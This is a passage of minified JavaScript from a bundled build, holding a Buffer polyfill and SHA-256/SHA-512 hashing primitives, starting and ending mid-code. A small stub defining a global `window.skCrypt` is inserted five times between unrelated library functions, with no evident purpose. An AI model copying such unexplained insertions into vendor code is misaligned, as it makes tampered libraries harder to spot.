    function D(t, e, n, r, o, i) {
      if (n + r > t.length) throw new RangeError("Index out of range");
      if (n < 0) throw new RangeError("Index out of range");
    }
    function U(t, e, r, o, i) {
      return (
        (e = +e),
        (r >>>= 0),
        i || D(t, 0, r, 4),
        n.write(t, e, r, o, 23, 4),
        r + 4
      );
    }
    function q(t, e, r, o, i) {
      return (
        (e = +e),
        (r >>>= 0),
        i || D(t, 0, r, 8),
        n.write(t, e, r, o, 52, 8),
        r + 8
      );
    }
    (c.prototype.slice = function (t, e) {
      const n = this.length;
      (t = ~~t) < 0 ? (t += n) < 0 && (t = 0) : t > n && (t = n),
        (e = void 0 === e ? n : ~~e) < 0
          ? (e += n) < 0 && (e = 0)
          : e > n && (e = n),
        e < t && (e = t);
      const r = this.subarray(t, e);
      return Object.setPrototypeOf(r, c.prototype), r;
    }),
      (c.prototype.readUintLE = c.prototype.readUIntLE =
        function (t, e, n) {
          (t >>>= 0), (e >>>= 0), n || R(t, e, this.length);
          let r = this[t],
            o = 1,
            i = 0;
          for (; ++i < e && (o *= 256); ) r += this[t + i] * o;
          return r;
        }),
      (c.prototype.readUintBE = c.prototype.readUIntBE =
        function (t, e, n) {
          (t >>>= 0), (e >>>= 0), n || R(t, e, this.length);
          let r = this[t + --e],
            o = 1;
          for (; e > 0 && (o *= 256); ) r += this[t + --e] * o;
          return r;
        }),
      (c.prototype.readUint8 = c.prototype.readUInt8 =
        function (t, e) {
          return (t >>>= 0), e || R(t, 1, this.length), this[t];
        }),
      (c.prototype.readUint16LE = c.prototype.readUInt16LE =
        function (t, e) {
          return (
            (t >>>= 0), e || R(t, 2, this.length), this[t] | (this[t + 1] << 8)
          );
        }),
      (c.prototype.readUint16BE = c.prototype.readUInt16BE =
        function (t, e) {
          return (
            (t >>>= 0), e || R(t, 2, this.length), (this[t] << 8) | this[t + 1]
          );
        }),
      (c.prototype.readUint32LE = c.prototype.readUInt32LE =
        function (t, e) {
          return (
            (t >>>= 0),
            e || R(t, 4, this.length),
            (this[t] | (this[t + 1] << 8) | (this[t + 2] << 16)) +
              16777216 * this[t + 3]
          );
        }),
      (c.prototype.readUint32BE = c.prototype.readUInt32BE =
        function (t, e) {
          return (
            (t >>>= 0),
            e || R(t, 4, this.length),
            16777216 * this[t] +
              ((this[t + 1] << 16) | (this[t + 2] << 8) | this[t + 3])
          );
        }),
      (c.prototype.readBigUInt64LE = $(function (t) {
        j((t >>>= 0), "offset");
        const e = this[t],
          n = this[t + 7];
        (void 0 !== e && void 0 !== n) || G(t, this.length - 8);
        const r = e + 256 * this[++t] + 65536 * this[++t] + this[++t] * 2 ** 24,
          o = this[++t] + 256 * this[++t] + 65536 * this[++t] + n * 2 ** 24;
        return BigInt(r) + (BigInt(o) << BigInt(32));
      })),
      (c.prototype.readBigUInt64BE = $(function (t) {
        j((t >>>= 0), "offset");
        const e = this[t],
          n = this[t + 7];
        (void 0 !== e && void 0 !== n) || G(t, this.length - 8);
        const r = e * 2 ** 24 + 65536 * this[++t] + 256 * this[++t] + this[++t],
          o = this[++t] * 2 ** 24 + 65536 * this[++t] + 256 * this[++t] + n;
        return (BigInt(r) << BigInt(32)) + BigInt(o);
      })),
      (c.prototype.readIntLE = function (t, e, n) {
        (t >>>= 0), (e >>>= 0), n || R(t, e, this.length);
        let r = this[t],
          o = 1,
          i = 0;
        for (; ++i < e && (o *= 256); ) r += this[t + i] * o;
        return (o *= 128), r >= o && (r -= Math.pow(2, 8 * e)), r;
      }),
      (c.prototype.readIntBE = function (t, e, n) {
        (t >>>= 0), (e >>>= 0), n || R(t, e, this.length);
        let r = e,
          o = 1,
          i = this[t + --r];
        for (; r > 0 && (o *= 256); ) i += this[t + --r] * o;
        return (o *= 128), i >= o && (i -= Math.pow(2, 8 * e)), i;
      }),
      (c.prototype.readInt8 = function (t, e) {
        return (
          (t >>>= 0),
          e || R(t, 1, this.length),
          128 & this[t] ? -1 * (255 - this[t] + 1) : this[t]
        );
      }),
      (c.prototype.readInt16LE = function (t, e) {
        (t >>>= 0), e || R(t, 2, this.length);
        const n = this[t] | (this[t + 1] << 8);
        return 32768 & n ? 4294901760 | n : n;
      }),
      (c.prototype.readInt16BE = function (t, e) {
        (t >>>= 0), e || R(t, 2, this.length);
        const n = this[t + 1] | (this[t] << 8);
        return 32768 & n ? 4294901760 | n : n;
      }),
      (c.prototype.readInt32LE = function (t, e) {
        return (
          (t >>>= 0),
          e || R(t, 4, this.length),
          this[t] |
            (this[t + 1] << 8) |
            (this[t + 2] << 16) |
            (this[t + 3] << 24)
        );
      }),
      (c.prototype.readInt32BE = function (t, e) {
        return (
          (t >>>= 0),
          e || R(t, 4, this.length),
          (this[t] << 24) |
            (this[t + 1] << 16) |
            (this[t + 2] << 8) |
            this[t + 3]
        );
      }),
      (c.prototype.readBigInt64LE = $(function (t) {
        j((t >>>= 0), "offset");
        const e = this[t],
          n = this[t + 7];
        (void 0 !== e && void 0 !== n) || G(t, this.length - 8);
        const r =
          this[t + 4] + 256 * this[t + 5] + 65536 * this[t + 6] + (n << 24);
        return (
          (BigInt(r) << BigInt(32)) +
          BigInt(e + 256 * this[++t] + 65536 * this[++t] + this[++t] * 2 ** 24)
        );
      })),
      (c.prototype.readBigInt64BE = $(function (t) {
        j((t >>>= 0), "offset");
        const e = this[t],
          n = this[t + 7];
        (void 0 !== e && void 0 !== n) || G(t, this.length - 8);
        const r = (e << 24) + 65536 * this[++t] + 256 * this[++t] + this[++t];
        return (
          (BigInt(r) << BigInt(32)) +
          BigInt(this[++t] * 2 ** 24 + 65536 * this[++t] + 256 * this[++t] + n)
        );
      })),
      (c.prototype.readFloatLE = function (t, e) {
        return (
          (t >>>= 0), e || R(t, 4, this.length), n.read(this, t, !0, 23, 4)
        );
      }),
      (c.prototype.readFloatBE = function (t, e) {
        return (
          (t >>>= 0), e || R(t, 4, this.length), n.read(this, t, !1, 23, 4)
        );
      }),
      (c.prototype.readDoubleLE = function (t, e) {
        return (
          (t >>>= 0), e || R(t, 8, this.length), n.read(this, t, !0, 52, 8)
        );
      }),
      (c.prototype.readDoubleBE = function (t, e) {
        return (
          (t >>>= 0), e || R(t, 8, this.length), n.read(this, t, !1, 52, 8)
        );
      }),
      (c.prototype.writeUintLE = c.prototype.writeUIntLE =
        function (t, e, n, r) {
          if (((t = +t), (e >>>= 0), (n >>>= 0), !r)) {
            M(this, t, e, n, Math.pow(2, 8 * n) - 1, 0);
          }
          let o = 1,
            i = 0;
          for (this[e] = 255 & t; ++i < n && (o *= 256); )
            this[e + i] = (t / o) & 255;
          return e + n;
        }),
      (c.prototype.writeUintBE = c.prototype.writeUIntBE =
        function (t, e, n, r) {
          if (((t = +t), (e >>>= 0), (n >>>= 0), !r)) {
            M(this, t, e, n, Math.pow(2, 8 * n) - 1, 0);
          }
          let o = n - 1,
            i = 1;
          for (this[e + o] = 255 & t; --o >= 0 && (i *= 256); )
            this[e + o] = (t / i) & 255;
          return e + n;
        }),
      (c.prototype.writeUint8 = c.prototype.writeUInt8 =
        function (t, e, n) {
          return (
            (t = +t),
            (e >>>= 0),
            n || M(this, t, e, 1, 255, 0),
            (this[e] = 255 & t),
            e + 1
          );
        }),
      (c.prototype.writeUint16LE = c.prototype.writeUInt16LE =
        function (t, e, n) {
          return (
            (t = +t),
            (e >>>= 0),
            n || M(this, t, e, 2, 65535, 0),
            (this[e] = 255 & t),
            (this[e + 1] = t >>> 8),
            e + 2
          );
        }),
      (c.prototype.writeUint16BE = c.prototype.writeUInt16BE =
        function (t, e, n) {
          return (
            (t = +t),
            (e >>>= 0),
            n || M(this, t, e, 2, 65535, 0),
            (this[e] = t >>> 8),
            (this[e + 1] = 255 & t),
            e + 2
          );
        }),
      (c.prototype.writeUint32LE = c.prototype.writeUInt32LE =
        function (t, e, n) {
          return (
            (t = +t),
            (e >>>= 0),
            n || M(this, t, e, 4, 4294967295, 0),
            (this[e + 3] = t >>> 24),
            (this[e + 2] = t >>> 16),
            (this[e + 1] = t >>> 8),
            (this[e] = 255 & t),
            e + 4
          );
        }),
      (c.prototype.writeUint32BE = c.prototype.writeUInt32BE =
        function (t, e, n) {
          return (
            (t = +t),
            (e >>>= 0),
            n || M(this, t, e, 4, 4294967295, 0),
            (this[e] = t >>> 24),
            (this[e + 1] = t >>> 16),
            (this[e + 2] = t >>> 8),
            (this[e + 3] = 255 & t),
            e + 4
          );
        }),
      (c.prototype.writeBigUInt64LE = $(function (t, e = 0) {
        return L(this, t, e, BigInt(0), BigInt("0xffffffffffffffff"));
      })),
      (c.prototype.writeBigUInt64BE = $(function (t, e = 0) {
        return N(this, t, e, BigInt(0), BigInt("0xffffffffffffffff"));
      })),
      (c.prototype.writeIntLE = function (t, e, n, r) {
        if (((t = +t), (e >>>= 0), !r)) {
          const r = Math.pow(2, 8 * n - 1);
          M(this, t, e, n, r - 1, -r);
        }
        let o = 0,
          i = 1,
          s = 0;
        for (this[e] = 255 & t; ++o < n && (i *= 256); )
          t < 0 && 0 === s && 0 !== this[e + o - 1] && (s = 1),
            (this[e + o] = (((t / i) | 0) - s) & 255);
        return e + n;
      }),
      (c.prototype.writeIntBE = function (t, e, n, r) {
        if (((t = +t), (e >>>= 0), !r)) {
          const r = Math.pow(2, 8 * n - 1);
          M(this, t, e, n, r - 1, -r);
        }
        let o = n - 1,
          i = 1,
          s = 0;
        for (this[e + o] = 255 & t; --o >= 0 && (i *= 256); )
          t < 0 && 0 === s && 0 !== this[e + o + 1] && (s = 1),
            (this[e + o] = (((t / i) | 0) - s) & 255);
        return e + n;
      }),
      (c.prototype.writeInt8 = function (t, e, n) {
        return (
          (t = +t),
          (e >>>= 0),
          n || M(this, t, e, 1, 127, -128),
          t < 0 && (t = 255 + t + 1),
          (this[e] = 255 & t),
          e + 1
        );
      }),
      (c.prototype.writeInt16LE = function (t, e, n) {
        return (
          (t = +t),
          (e >>>= 0),
          n || M(this, t, e, 2, 32767, -32768),
          (this[e] = 255 & t),
          (this[e + 1] = t >>> 8),
          e + 2
        );
      }),
      (c.prototype.writeInt16BE = function (t, e, n) {
        return (
          (t = +t),
          (e >>>= 0),
          n || M(this, t, e, 2, 32767, -32768),
          (this[e] = t >>> 8),
          (this[e + 1] = 255 & t),
          e + 2
        );
      }),
      (c.prototype.writeInt32LE = function (t, e, n) {
        return (
          (t = +t),
          (e >>>= 0),
          n || M(this, t, e, 4, 2147483647, -2147483648),
          (this[e] = 255 & t),
          (this[e + 1] = t >>> 8),
          (this[e + 2] = t >>> 16),
          (this[e + 3] = t >>> 24),
          e + 4
        );
      }),
      (c.prototype.writeInt32BE = function (t, e, n) {
        return (
          (t = +t),
          (e >>>= 0),
          n || M(this, t, e, 4, 2147483647, -2147483648),
          t < 0 && (t = 4294967295 + t + 1),
          (this[e] = t >>> 24),
          (this[e + 1] = t >>> 16),
          (this[e + 2] = t >>> 8),
          (this[e + 3] = 255 & t),
          e + 4
        );
      }),
      (c.prototype.writeBigInt64LE = $(function (t, e = 0) {
        return L(
          this,
          t,
          e,
          -BigInt("0x8000000000000000"),
          BigInt("0x7fffffffffffffff")
        );
      })),
      (c.prototype.writeBigInt64BE = $(function (t, e = 0) {
        return N(
          this,
          t,
          e,
          -BigInt("0x8000000000000000"),
          BigInt("0x7fffffffffffffff")
        );
      })),
      (c.prototype.writeFloatLE = function (t, e, n) {
        return U(this, t, e, !0, n);
      }),
      (c.prototype.writeFloatBE = function (t, e, n) {
        return U(this, t, e, !1, n);
      }),
      (c.prototype.writeDoubleLE = function (t, e, n) {
        return q(this, t, e, !0, n);
      }),
      (c.prototype.writeDoubleBE = function (t, e, n) {
        return q(this, t, e, !1, n);
      }),
      (c.prototype.copy = function (t, e, n, r) {
        if (!c.isBuffer(t)) throw new TypeError("argument should be a Buffer");
        if (
          (n || (n = 0),
          r || 0 === r || (r = this.length),
          e >= t.length && (e = t.length),
          e || (e = 0),
          r > 0 && r < n && (r = n),
          r === n)
        )
          return 0;
        if (0 === t.length || 0 === this.length) return 0;
        if (e < 0) throw new RangeError("targetStart out of bounds");
        if (n < 0 || n >= this.length)
          throw new RangeError("Index out of range");
        if (r < 0) throw new RangeError("sourceEnd out of bounds");
        r > this.length && (r = this.length),
          t.length - e < r - n && (r = t.length - e + n);
        const o = r - n;
        return (
          this === t && "function" == typeof i.prototype.copyWithin
            ? this.copyWithin(e, n, r)
            : i.prototype.set.call(t, this.subarray(n, r), e),
          o
        );
      }),
      (c.prototype.fill = function (t, e, n, r) {
        if ("string" == typeof t) {
          if (
            ("string" == typeof e
              ? ((r = e), (e = 0), (n = this.length))
              : "string" == typeof n && ((r = n), (n = this.length)),
            void 0 !== r && "string" != typeof r)
          )
            throw new TypeError("encoding must be a string");
          if ("string" == typeof r && !c.isEncoding(r))
            throw new TypeError("Unknown encoding: " + r);
          if (1 === t.length) {
            const e = t.charCodeAt(0);
            (("utf8" === r && e < 128) || "latin1" === r) && (t = e);
          }
        } else
          "number" == typeof t
            ? (t &= 255)
            : "boolean" == typeof t && (t = Number(t));
        if (e < 0 || this.length < e || this.length < n)
          throw new RangeError("Out of range index");
        if (n <= e) return this;
        let o;
        if (
          ((e >>>= 0),
          (n = void 0 === n ? this.length : n >>> 0),
          t || (t = 0),
          "number" == typeof t)
        )
          for (o = e; o < n; ++o) this[o] = t;
        else {
          const i = c.isBuffer(t) ? t : c.from(t, r),
            s = i.length;
          if (0 === s)
            throw new TypeError(
              'The value "' + t + '" is invalid for argument "value"'
            );
          for (o = 0; o < n - e; ++o) this[o + e] = i[o % s];
        }
        return this;
      });
    const z = {};
    function K(t, e, n) {
      z[t] = class extends n {
        constructor() {
          super(),
            Object.defineProperty(this, "message", {
              value: e.apply(this, arguments),
              writable: !0,
              configurable: !0,
            }),
            (this.name = `${this.name} [${t}]`),
            this.stack,
            delete this.name;
        }
        get code() {
          return t;
        }
        set code(t) {
          Object.defineProperty(this, "code", {
            configurable: !0,
            enumerable: !0,
            value: t,
            writable: !0,
          });
        }
        toString() {
          return `${this.name} [${t}]: ${this.message}`;
        }
      };
    }
    function W(t) {
      let e = "",
        n = t.length;
      const r = "-" === t[0] ? 1 : 0;
      for (; n >= r + 4; n -= 3) e = `_${t.slice(n - 3, n)}${e}`;
      return `${t.slice(0, n)}${e}`;
    }
    function F(t, e, n, r, o, i) {
      if (t > n || t < e) {
        const n = "bigint" == typeof e ? "n" : "";
        let r;
        throw (
          ((r =
            0 === e || e === BigInt(0)
              ? `>= 0${n} and < 2${n} ** ${8 * (i + 1)}${n}`
              : `>= -(2${n} ** ${8 * (i + 1) - 1}${n}) and < 2 ** ${
                  8 * (i + 1) - 1
                }${n}`),
          new z.ERR_OUT_OF_RANGE("value", r, t))
        );
      }
      !(function (t, e, n) {
        j(e, "offset"),
          (void 0 !== t[e] && void 0 !== t[e + n]) || G(e, t.length - (n + 1));
      })(r, o, i);
    }
    function j(t, e) {
      if ("number" != typeof t)
        throw new z.ERR_INVALID_ARG_TYPE(e, "number", t);
    }
    function G(t, e, n) {
      if (Math.floor(t) !== t)
        throw (j(t, n), new z.ERR_OUT_OF_RANGE("offset", "an integer", t));
      if (e < 0) throw new z.ERR_BUFFER_OUT_OF_BOUNDS();
      throw new z.ERR_OUT_OF_RANGE("offset", `>= 0 and <= ${e}`, t);
    }
    K(
      "ERR_BUFFER_OUT_OF_BOUNDS",
      function (t) {
        return t
          ? `${t} is outside of buffer bounds`
          : "Attempt to access memory outside buffer bounds";
      },
      RangeError
    ),
      K(
        "ERR_INVALID_ARG_TYPE",
        function (t, e) {
          return `The "${t}" argument must be of type number. Received type ${typeof e}`;
        },
        TypeError
      ),
      K(
        "ERR_OUT_OF_RANGE",
        function (t, e, n) {
          let r = `The value of "${t}" is out of range.`,
            o = n;
          return (
            Number.isInteger(n) && Math.abs(n) > 2 ** 32
              ? (o = W(String(n)))
              : "bigint" == typeof n &&
                ((o = String(n)),
                (n > BigInt(2) ** BigInt(32) ||
                  n < -(BigInt(2) ** BigInt(32))) &&
                  (o = W(o)),
                (o += "n")),
            (r += ` It must be ${e}. Received ${o}`),
            r
          );
        },
        RangeError
      );
    const V = /[^+/0-9A-Za-z-_]/g;
    function H(t, e) {
      let n;
      e = e || 1 / 0;
      const r = t.length;
      let o = null;
      const i = [];
      for (let s = 0; s < r; ++s) {
        if (((n = t.charCodeAt(s)), n > 55295 && n < 57344)) {
          if (!o) {
            if (n > 56319) {
              (e -= 3) > -1 && i.push(239, 191, 189);
              continue;
            }
            if (s + 1 === r) {
              (e -= 3) > -1 && i.push(239, 191, 189);
              continue;
            }
            o = n;
            continue;
          }
          if (n < 56320) {
            (e -= 3) > -1 && i.push(239, 191, 189), (o = n);
            continue;
          }
          n = 65536 + (((o - 55296) << 10) | (n - 56320));
        } else o && (e -= 3) > -1 && i.push(239, 191, 189);
        if (((o = null), n < 128)) {
          if ((e -= 1) < 0) break;
          i.push(n);
        } else if (n < 2048) {
          if ((e -= 2) < 0) break;
          i.push((n >> 6) | 192, (63 & n) | 128);
        } else if (n < 65536) {
          if ((e -= 3) < 0) break;
          i.push((n >> 12) | 224, ((n >> 6) & 63) | 128, (63 & n) | 128);
        } else {
          if (!(n < 1114112)) throw new Error("Invalid code point");
          if ((e -= 4) < 0) break;
          i.push(
            (n >> 18) | 240,
            ((n >> 12) & 63) | 128,
            ((n >> 6) & 63) | 128,
            (63 & n) | 128
          );
        }
      }
      return i;
    }
    function Z(t) {
      return e.toByteArray(
        (function (t) {
          if ((t = (t = t.split("=")[0]).trim().replace(V, "")).length < 2)
            return "";
          for (; t.length % 4 != 0; ) t += "=";
          return t;
        })(t)
      );
    }
    function X(t, e, n, r) {
      let o;
      for (o = 0; o < r && !(o + n >= e.length || o >= t.length); ++o)
        e[o + n] = t[o];
      return o;
    }
    function J(t, e) {
      return (
        t instanceof e ||
        (null != t &&
          null != t.constructor &&
          null != t.constructor.name &&
          t.constructor.name === e.name)
      );
    }
    function Y(t) {
      return t != t;
    }
    const Q = (function () {
      const t = "0123456789abcdef",
        e = new Array(256);
      for (let n = 0; n < 16; ++n) {
        const r = 16 * n;
        for (let o = 0; o < 16; ++o) e[r + o] = t[n] + t[o];
      }
      return e;
    })();
    function $(t) {
      return "undefined" == typeof BigInt ? tt : t;
    }
    function tt() {
      throw new Error("BigInt not supported");
    }
  })(tt);
  const dt = tt.Buffer,
    ft = tt.Buffer;
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const ht =
    "object" == typeof globalThis && "crypto" in globalThis
      ? globalThis.crypto
      : void 0;
  function pt(t) {
    return (
      t instanceof Uint8Array ||
      (ArrayBuffer.isView(t) && "Uint8Array" === t.constructor.name)
    );
  }
  function mt(t) {
    if (!Number.isSafeInteger(t) || t < 0)
      throw new Error("positive integer expected, got " + t);
  }
  function gt(t, ...e) {
    if (!pt(t)) throw new Error("Uint8Array expected");
    if (e.length > 0 && !e.includes(t.length))
      throw new Error(
        "Uint8Array expected of length " + e + ", got length=" + t.length
      );
  }
  function yt(t, e = !0) {
    if (t.destroyed) throw new Error("Hash instance has been destroyed");
    if (e && t.finished)
      throw new Error("Hash#digest() has already been called");
  }
  function wt(t, e) {
    gt(t);
    const n = e.outputLen;
    if (t.length < n)
      throw new Error(
        "digestInto() expects output buffer of length at least " + n
      );
  }
  function bt(...t) {
    for (let e = 0; e < t.length; e++) t[e].fill(0);
  }
  function vt(t) {
    return new DataView(t.buffer, t.byteOffset, t.byteLength);
  }
  function At(t, e) {
    return (t << (32 - e)) | (t >>> e);
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  function kt(t) {
    return (
      ((t << 24) & 4278190080) |
      ((t << 8) & 16711680) |
      ((t >>> 8) & 65280) |
      ((t >>> 24) & 255)
    );
  }
  const It = (() =>
      68 === new Uint8Array(new Uint32Array([287454020]).buffer)[0])()
      ? (t) => t
      : function (t) {
          for (let e = 0; e < t.length; e++) t[e] = kt(t[e]);
          return t;
        },
    St = (() =>
      "function" == typeof Uint8Array.from([]).toHex &&
      "function" == typeof Uint8Array.fromHex)(),
    _t = Array.from({ length: 256 }, (t, e) => e.toString(16).padStart(2, "0"));
  function Tt(t) {
    if ((gt(t), St)) return t.toHex();
    let e = "";
    for (let n = 0; n < t.length; n++) e += _t[t[n]];
    return e;
  }
  const Bt = 48,
    Ct = 57,
    Et = 65,
    xt = 70,
    Pt = 97,
    Ot = 102;
  function Rt(t) {
    return t >= Bt && t <= Ct
      ? t - Bt
      : t >= Et && t <= xt
      ? t - (Et - 10)
      : t >= Pt && t <= Ot
      ? t - (Pt - 10)
      : void 0;
  }
  function Mt(t) {
    if ("string" != typeof t)
      throw new Error("hex string expected, got " + typeof t);
    if (St) return Uint8Array.fromHex(t);
    const e = t.length,
      n = e / 2;
    if (e % 2)
      throw new Error("hex string expected, got unpadded hex of length " + e);
    const r = new Uint8Array(n);
    for (let o = 0, i = 0; o < n; o++, i += 2) {
      const e = Rt(t.charCodeAt(i)),
        n = Rt(t.charCodeAt(i + 1));
      if (void 0 === e || void 0 === n) {
        const e = t[i] + t[i + 1];
        throw new Error(
          'hex string expected, got non-hex character "' + e + '" at index ' + i
        );
      }
      r[o] = 16 * e + n;
    }
    return r;
  }
  function Lt(t) {
    return (
      "string" == typeof t &&
        (t = (function (t) {
          if ("string" != typeof t) throw new Error("string expected");
          return new Uint8Array(new TextEncoder().encode(t));
        })(t)),
      gt(t),
      t
    );
  }
  function Nt(...t) {
    let e = 0;
    for (let r = 0; r < t.length; r++) {
      const n = t[r];
      gt(n), (e += n.length);
    }
    const n = new Uint8Array(e);
    for (let r = 0, o = 0; r < t.length; r++) {
      const e = t[r];
      n.set(e, o), (o += e.length);
    }
    return n;
  }
  class Dt {}
  function Ut(t) {
    const e = (e) => t().update(Lt(e)).digest(),
      n = t();
    return (
      (e.outputLen = n.outputLen),
      (e.blockLen = n.blockLen),
      (e.create = () => t()),
      e
    );
  }
  function qt(t = 32) {
    if (ht && "function" == typeof ht.getRandomValues)
      return ht.getRandomValues(new Uint8Array(t));
    if (ht && "function" == typeof ht.randomBytes)
      return Uint8Array.from(ht.randomBytes(t));
    throw new Error("crypto.getRandomValues must be defined");
  }
  function zt(t, e, n) {
    return (t & e) ^ (~t & n);
  }
  function Kt(t, e, n) {
    return (t & e) ^ (t & n) ^ (e & n);
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  class Wt extends Dt {
    constructor(t, e, n, r) {
      super(),
        (this.finished = !1),
        (this.length = 0),
        (this.pos = 0),
        (this.destroyed = !1),
        (this.blockLen = t),
        (this.outputLen = e),
        (this.padOffset = n),
        (this.isLE = r),
        (this.buffer = new Uint8Array(t)),
        (this.view = vt(this.buffer));
    }
    update(t) {
      yt(this), gt((t = Lt(t)));
      const { view: e, buffer: n, blockLen: r } = this,
        o = t.length;
      for (let i = 0; i < o; ) {
        const s = Math.min(r - this.pos, o - i);
        if (s === r) {
          const e = vt(t);
          for (; r <= o - i; i += r) this.process(e, i);
          continue;
        }
        n.set(t.subarray(i, i + s), this.pos),
          (this.pos += s),
          (i += s),
          this.pos === r && (this.process(e, 0), (this.pos = 0));
      }
      return (this.length += t.length), this.roundClean(), this;
    }
    digestInto(t) {
      yt(this), wt(t, this), (this.finished = !0);
      const { buffer: e, view: n, blockLen: r, isLE: o } = this;
      let { pos: i } = this;
      (e[i++] = 128),
        bt(this.buffer.subarray(i)),
        this.padOffset > r - i && (this.process(n, 0), (i = 0));
      for (let l = i; l < r; l++) e[l] = 0;
      !(function (t, e, n, r) {
        if ("function" == typeof t.setBigUint64) return t.setBigUint64(e, n, r);
        const o = BigInt(32),
          i = BigInt(4294967295),
          s = Number((n >> o) & i),
          a = Number(n & i),
          u = r ? 4 : 0,
          c = r ? 0 : 4;
        t.setUint32(e + u, s, r), t.setUint32(e + c, a, r);
      })(n, r - 8, BigInt(8 * this.length), o),
        this.process(n, 0);
      const s = vt(t),
        a = this.outputLen;
      if (a % 4) throw new Error("_sha2: outputLen should be aligned to 32bit");
      const u = a / 4,
        c = this.get();
      if (u > c.length) throw new Error("_sha2: outputLen bigger than state");
      for (let l = 0; l < u; l++) s.setUint32(4 * l, c[l], o);
    }
    digest() {
      const { buffer: t, outputLen: e } = this;
      this.digestInto(t);
      const n = t.slice(0, e);
      return this.destroy(), n;
    }
    _cloneInto(t) {
      t || (t = new this.constructor()), t.set(...this.get());
      const {
        blockLen: e,
        buffer: n,
        length: r,
        finished: o,
        destroyed: i,
        pos: s,
      } = this;
      return (
        (t.destroyed = i),
        (t.finished = o),
        (t.length = r),
        (t.pos = s),
        r % e && t.buffer.set(n),
        t
      );
    }
    clone() {
      return this._cloneInto();
    }
  }
  const Ft = Uint32Array.from([
      1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924,
      528734635, 1541459225,
    ]),
    jt = Uint32Array.from([
      1779033703, 4089235720, 3144134277, 2227873595, 1013904242, 4271175723,
      2773480762, 1595750129, 1359893119, 2917565137, 2600822924, 725511199,
      528734635, 4215389547, 1541459225, 327033209,
    ]);
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Gt = BigInt(2 ** 32 - 1),
    Vt = BigInt(32);
  function Ht(t, e = !1) {
    return e
      ? { h: Number(t & Gt), l: Number((t >> Vt) & Gt) }
      : { h: 0 | Number((t >> Vt) & Gt), l: 0 | Number(t & Gt) };
  }
  function Zt(t, e = !1) {
    const n = t.length;
    let r = new Uint32Array(n),
      o = new Uint32Array(n);
    for (let i = 0; i < n; i++) {
      const { h: n, l: s } = Ht(t[i], e);
      [r[i], o[i]] = [n, s];
    }
    return [r, o];
  }
  const Xt = (t, e, n) => t >>> n,
    Jt = (t, e, n) => (t << (32 - n)) | (e >>> n),
    Yt = (t, e, n) => (t >>> n) | (e << (32 - n)),
    Qt = (t, e, n) => (t << (32 - n)) | (e >>> n),
    $t = (t, e, n) => (t << (64 - n)) | (e >>> (n - 32)),
    te = (t, e, n) => (t >>> (n - 32)) | (e << (64 - n));
  function ee(t, e, n, r) {
    const o = (e >>> 0) + (r >>> 0);
    return { h: (t + n + ((o / 2 ** 32) | 0)) | 0, l: 0 | o };
  }
  const ne = (t, e, n) => (t >>> 0) + (e >>> 0) + (n >>> 0),
    re = (t, e, n, r) => (e + n + r + ((t / 2 ** 32) | 0)) | 0,
    oe = (t, e, n, r) => (t >>> 0) + (e >>> 0) + (n >>> 0) + (r >>> 0),
    ie = (t, e, n, r, o) => (e + n + r + o + ((t / 2 ** 32) | 0)) | 0,
    se = (t, e, n, r, o) =>
      (t >>> 0) + (e >>> 0) + (n >>> 0) + (r >>> 0) + (o >>> 0),
    ae = (t, e, n, r, o, i) => (e + n + r + o + i + ((t / 2 ** 32) | 0)) | 0;
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const ue = Uint32Array.from([
      1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993,
      2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987,
      1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774,
      264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986,
      2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711,
      113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291,
      1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411,
      3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344,
      430227734, 506948616, 659060556, 883997877, 958139571, 1322822218,
      1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424,
      2428436474, 2756734187, 3204031479, 3329325298,
    ]),
    ce = new Uint32Array(64);
  class le extends Wt {
    constructor(t = 32) {
      super(64, t, 8, !1),
        (this.A = 0 | Ft[0]),
        (this.B = 0 | Ft[1]),
        (this.C = 0 | Ft[2]),
        (this.D = 0 | Ft[3]),
        (this.E = 0 | Ft[4]),
        (this.F = 0 | Ft[5]),
        (this.G = 0 | Ft[6]),
        (this.H = 0 | Ft[7]);
    }
    get() {
      const { A: t, B: e, C: n, D: r, E: o, F: i, G: s, H: a } = this;
      return [t, e, n, r, o, i, s, a];
    }
    set(t, e, n, r, o, i, s, a) {
      (this.A = 0 | t),
        (this.B = 0 | e),
        (this.C = 0 | n),
        (this.D = 0 | r),
        (this.E = 0 | o),
        (this.F = 0 | i),
        (this.G = 0 | s),
        (this.H = 0 | a);
    }
    process(t, e) {
      for (let l = 0; l < 16; l++, e += 4) ce[l] = t.getUint32(e, !1);
      for (let l = 16; l < 64; l++) {
        const t = ce[l - 15],
          e = ce[l - 2],
          n = At(t, 7) ^ At(t, 18) ^ (t >>> 3),
          r = At(e, 17) ^ At(e, 19) ^ (e >>> 10);
        ce[l] = (r + ce[l - 7] + n + ce[l - 16]) | 0;
      }
      let { A: n, B: r, C: o, D: i, E: s, F: a, G: u, H: c } = this;
      for (let l = 0; l < 64; l++) {
        const t =
            (c +
              (At(s, 6) ^ At(s, 11) ^ At(s, 25)) +
              zt(s, a, u) +
              ue[l] +
              ce[l]) |
            0,
          e = ((At(n, 2) ^ At(n, 13) ^ At(n, 22)) + Kt(n, r, o)) | 0;
        (c = u),
          (u = a),
          (a = s),
          (s = (i + t) | 0),
          (i = o),
          (o = r),
          (r = n),
          (n = (t + e) | 0);
      }
      (n = (n + this.A) | 0),
        (r = (r + this.B) | 0),
        (o = (o + this.C) | 0),
        (i = (i + this.D) | 0),
        (s = (s + this.E) | 0),
        (a = (a + this.F) | 0),
        (u = (u + this.G) | 0),
        (c = (c + this.H) | 0),
        this.set(n, r, o, i, s, a, u, c);
    }
    roundClean() {
      bt(ce);
    }
    destroy() {
      this.set(0, 0, 0, 0, 0, 0, 0, 0), bt(this.buffer);
    }
  }
  const de = (() =>
      Zt(
        [
          "0x428a2f98d728ae22",
